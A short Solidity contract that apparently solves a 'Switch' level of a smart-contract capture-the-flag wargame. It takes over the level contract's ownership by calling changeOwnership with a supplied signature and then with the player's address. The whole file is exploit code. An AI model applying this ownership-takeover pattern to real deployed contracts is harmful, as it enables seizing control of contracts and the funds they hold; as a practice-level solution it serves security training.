// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import '../levels/Switch.sol';

contract SwitchAttack {
  function attack(address _target, address _player, uint8 v, bytes32 r, bytes32 s) public {
    Switch target = Switch(_target);
    target.changeOwnership(v, r, s);
    target.changeOwnership(_player);
  }
}